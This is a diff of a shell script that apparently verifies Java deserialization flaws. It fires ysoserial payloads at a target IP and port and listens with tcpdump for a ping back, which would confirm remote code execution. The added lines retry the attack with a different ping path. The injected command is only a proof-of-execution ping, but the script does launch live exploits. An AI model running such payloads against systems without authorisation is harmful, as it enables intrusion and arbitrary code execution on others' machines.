@@ -38,6 +38,9 @@ sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &"
 print_info "Running ysoserial command for target Linux"
 print_info "java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} \"/bin/ping -c 4 ${LOCALIP}\""
 java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} "/bin/ping -c 4 ${LOCALIP}"
+echo
+print_info "java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} \"/usr/bin/ping -c 4 ${LOCALIP}\""
+java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} "/usr/bin/ping -c 4 ${LOCALIP}"
 
 # print_info "Wait a little bit..."
 # sleep 3
